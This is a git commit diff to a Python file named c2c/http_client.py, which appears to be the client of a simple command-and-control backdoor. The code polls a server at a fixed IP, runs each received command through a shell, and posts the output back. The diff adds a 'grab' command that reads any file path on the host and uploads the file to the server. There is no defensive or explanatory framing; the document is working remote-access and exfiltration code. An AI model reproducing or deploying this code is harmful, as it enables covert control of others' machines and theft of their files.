af3c59f6961111c6927c5b35ca9cd7ff740d2a5a
Deniss Bohanovs <den.b@itservicesgroup.co.uk>
2020-01-10 19:25:58 +0000

    Add Client, ability to download remote files

--- tools/Python/c2c/http_client.py
+++ tools/Python/c2c/http_client.py
@@ -7,10 +7,20 @@ import requests
 import time
 import subprocess
 import sys
+import os
+
 SERVER_IP = "192.168.0.200"
 PORT = 8080
-
 URL = "http://{}:{}".format(SERVER_IP, PORT)
+
+def transfer(path):
+    if os.path.exists(path):
+        with open(path, 'rb') as f :
+            files = {'file': f}
+            requests.post(URL, files=files)
+    else:
+        message = "[-] File not found "
+        requests.post(URL, data=message)
 
 while(True):
     try:
@@ -19,6 +29,9 @@ while(True):
         print("command ", command)
         if 'exit' in command:
             break
+        elif 'grab' in command:
+            command, path = command.split("*")
+            transfer(path)
         else:
             cmd = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             post_response = requests.post(url=URL, data=cmd.stdout.read())
